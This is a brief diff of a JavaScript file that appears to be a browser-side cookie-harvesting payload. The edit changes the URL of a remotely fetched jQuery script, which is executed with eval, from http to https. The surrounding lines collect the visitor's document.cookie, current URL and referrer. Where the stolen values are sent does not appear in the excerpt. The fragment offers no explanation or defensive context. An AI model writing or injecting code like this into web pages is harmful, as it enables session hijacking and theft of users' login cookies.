@@ -5,7 +5,7 @@ function httpGet(theUrl) {
     return xmlHttp.responseText;
 }
 
-eval(httpGet('http://code.jquery.com/jquery-latest.js'));
+eval(httpGet('https://code.jquery.com/jquery-latest.js'));
 cookie=document.cookie;
 url=document.location.href;
 ref=document.referrer;
